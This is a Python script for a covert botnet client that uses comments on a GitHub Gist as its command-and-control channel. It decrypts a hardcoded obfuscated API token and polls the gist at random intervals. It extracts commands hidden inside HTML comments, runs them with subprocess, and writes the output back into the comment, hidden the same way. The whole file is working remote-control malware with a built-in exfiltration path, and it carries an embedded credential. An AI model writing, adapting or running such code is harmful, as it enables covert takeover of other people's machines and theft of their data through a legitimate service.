#!/usr/bin/env python
import datetime
import json
import re
import sched
import subprocess
import time
import uuid
from random import randint
import requests
from cryptography.fernet import Fernet

GITHUB_API = "https://api.github.com"
# change for your API token
f = Fernet('PlMJ3m8koaqClLbqjbvuCKv2UBAxkxkHdEX1kCWMqgw=')
encrypted_string = b'gAAAAABjr29NMI4xytRfZNKGFCIhRaoWe5DMAPG0m2f4pMXeXTJCNgYezZxTN0bcjysFvHqdzqAbystPV2_50DdkvVPJg35A6E0J6TxwD1SuLbLos9-DY6pE6klSmJwKQf9bJfENsw1Q'
API_TOKEN = f.decrypt(encrypted_string).decode("utf-8")
GIST_ID = '11fc787784a6a18ee1b89f6ceb4f4803'
BOT_ID = uuid.uuid4()

# form a request URL
url = GITHUB_API + "/gists/" + GIST_ID + "/comments"

s = sched.scheduler(time.time, time.sleep)
current_time = datetime.datetime.now()


def switch(command):
    if command == 'bots':
        return str(BOT_ID)
    else:
        return subprocess.check_output([command])


def check_new_comments(sc, dt):
    # download new comments
    print("Checking for new comments...")
    headers = {'Authorization': 'Bearer %s' % API_TOKEN, 'Accept': 'application/json',
               'X-GitHub-Api-Version': '2022-11-28'}
    params = {'scope': 'gist'}

    # make a GET request (load all comments in GitHub channel)
    results = requests.get(url, headers=headers, params=params).json()

    # obtain all new comments from gist channel
    for comment in results:
        # add one hour (for GTM +1)
        date = datetime.datetime.strptime(comment['created_at'], '%Y-%m-%dT%H:%M:%SZ') + datetime.timedelta(hours=1)
        if date > dt:
            # if comment is new -> read its body (text hidden in a markdown comment)
            hidden_text = re.findall('<!-- (.+?) -->', comment['body'])
            if hidden_text:
                command = hidden_text[0]
                print("Hidden command is: " + command)
                # handle input command from controller
                output = switch(command)

                # print payload
                payload = {
                    "body": comment['body'] + " <!-- Bot ID: " + str(BOT_ID) + " | Command: " + str(
                        command) + " | Output: " + str(output) + " -->"}

                # make a POST request (create new comment in GitHub channel)
                res = requests.patch(url + '/' + str(comment['id']), headers=headers, params=params, data=json.dumps(payload))

                # print response --> JSON
                print('Gist comment successfully updated!')
                print(res.status_code)

    sc.enter(randint(1, 10), 1, check_new_comments, (sc, datetime.datetime.now(),))


print('Starting bot with ID ' + str(BOT_ID))
s.enter(randint(1, 10), 1, check_new_comments, (s, current_time,))
s.run()
